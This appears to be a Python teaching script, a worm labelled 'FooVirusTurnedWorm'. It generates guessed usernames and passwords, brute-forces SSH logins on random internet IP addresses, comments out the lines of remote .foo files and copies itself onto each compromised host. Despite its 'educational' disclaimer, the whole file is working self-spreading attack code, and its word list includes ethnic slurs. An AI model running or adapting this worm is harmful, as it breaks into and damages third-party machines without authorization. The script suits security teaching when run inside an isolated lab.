#!/usr/bin/env python

import sys
import os
import glob

import random
import paramiko
import scp
import select
import signal


## FooVirusTurnedWorm.py## Author: Avi kak(kak @purdue.edu)## Date: April 5, 2016
debug = 1

print("\nHELLO FROM FooVirus\n")

print("This is a demonstration of how easy it is to write")
print("a self-replicating program. This virus will infect")
print("all files with names ending in .foo in the directory in")
print("which you execute an infected file.  If you send an")
print("infected file to someone else and they execute it, their,")
print(".foo files will be damaged also.\n")

print("Note that this is a safe virus (for educational purposes")
print("only) since it does not carry a harmful payload.  All it")
print("does is to print out this message and comment out the")
print("code in .foo files.\n")

# Use trigrams and digrams to generate usernames and passwords to get into machines# Add "us", "155", "cs"
#to ensure our machines can be hacked
NHOSTS = NUSERNAMES = NPASSWDS = 3
trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum
bus but buz cam cat ced cel cin cid cip cir con cod cos cop
cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab
faq fat
for fuk gab jab jad jam jap jad jas jew koo kee kil
kim kin kip kir kis kit kix laf lad laf lag led leg lem len
let nab nac nad nag nal nam nan nap nar nas nat oda ode odi
odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak
pal pam pap par pas pat pek pem pet qik rab rob rik rom sab
sad sag sak sam sap sas sat sit sid sic six tab tad tom tod
wad was wot xin zap zuk 155 '''

digrams = '''al an ar as at ba bo cu cs da de do ed ea en er es et go gu ha hi
ho hu in is it le of on ou or ra re ti to te sa se si ve ur us '''

def get_new_usernames(how_many):
    if debug: return ['user']      # need a working username for debugging
    if how_many is 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    usernames.append("user")
    return usernames

def get_new_passwds(how_many):
    if debug: return ['cs155']      # need a working pwd for debugging
    if how_many is 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    passwds = [ ''.join(map(lambda x:  random.sample(trigrams,1)[0] + (str(random.randint(0,9)) if random.random() > 0.5 else '') if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    passwds.append("cs155")
    return passwds

def get_fresh_ipaddresses(how_many):
    if debug: return ['192.168.56.102', '192.168.56.103']
                    # Provide one or more IP address that you
                    # want `attacked' for debugging purposes.
                    # The usrname and password you provided
                    # in the previous two functions must
                    # work on these hosts.
    if how_many is 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
        ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
    return ipaddresses


# Tools (like DenyHosts) may be watching on machines for repeated attempts to login, hence we ensure the IP we ping changes everytime
while True:
    usernames = get_new_usernames(NUSERNAMES)
    print("-----",usernames)
    passwds =   get_new_passwds(NPASSWDS)
#    print("usernames: %s" % str(usernames))
#    print("passwords: %s" % str(passwds))
    # First loop over passwords
    for passwd in passwds:
        # Then loop over user names
        for user in usernames:
            # And, finally, loop over randomly chosen IP addresses
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print("\nTrying password %s for user %s at IP address: %s" % (passwd,user,ip_address))
                files_of_interest_at_target = []
                try:
                    print("trying to open ssh connection")
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                    print("\n\nconnected\n")
                    #IN = open(sys.argv[0], 'r')
                    #virus = [line for (i,line) in enumerate(IN) if i < 37]
                    cmd = 'ls *.foo'
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    print(len(received_list), " files: ", received_list) 

                    cmd = "ls FooVirus.py"
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    check_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    print(len(check_list), " files: ", check_list)
                   
                    #already infected
                    if len(check_list) > 0:
                        print("already infected")
                        exit() 

                    # Corrupt files
                    for item in received_list:  
                        item = item.replace("\n", "")
                        print("Corrupting", item)
                        cmd = "sed -i -e 's/^/#/' %s" % item
                        stdin, stdout, stderr = ssh.exec_command(cmd)
                        print("done")

                    scpcon = scp.SCPClient(ssh.get_transport())
                    scpcon.put(sys.argv[0])
                    scpcon.close()

                except:
                    next

    if debug: break
